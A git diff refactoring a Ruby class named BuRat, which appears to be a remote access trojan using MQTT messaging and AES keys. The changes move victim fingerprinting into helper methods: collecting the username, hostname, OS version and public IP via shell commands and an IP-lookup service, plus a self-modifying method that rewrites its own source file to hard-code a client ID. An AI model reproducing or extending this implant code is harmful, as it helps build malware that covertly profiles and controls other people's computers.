@@ -16,10 +16,10 @@ class BuRat
   attr_reader :topics
   def initialize()
     begin
-      @id = File.exist?('temp') ? File.read('temp') : File.read(File.write('temp', SecureRandom.hex(2)))
-      @host = OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
-      @os = (OS.windows? ? `ver` : `uname -sr`).strip
-      @ip = open('http://whatismyip.akamai.com').read
+      @id = id()
+      @host = host()
+      @os = os()
+      @ip = ip()
       @status = :offline
       @internals = {
         :mqtt           => PahoMqtt::Client.new,
@@ -45,7 +45,7 @@ class BuRat
     	:id => @id,
     	:host => @host,
     	:os => @os,
-    	:ip => @ip,
+    	:ip => ip(),
     	:status => @status,
     	:aes => {
     		:key => @internals[:aes].key,
@@ -114,5 +114,23 @@ class BuRat
   	end
   	topic = levels.join('/')
     return topic
+  end
+
+  def id()
+    id = SecureRandom.hex(2)
+    File.write(__FILE__, File.read(__FILE__).gsub(/@id = [i][d][(][)]/, "@id = '#{id}'"))
+    return id
+  end
+
+  def host()
+    OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
+  end
+
+  def os()
+    (OS.windows? ? `ver` : `uname -sr`).strip
+  end
+
+  def ip()
+    open('http://whatismyip.akamai.com').read
   end
 end
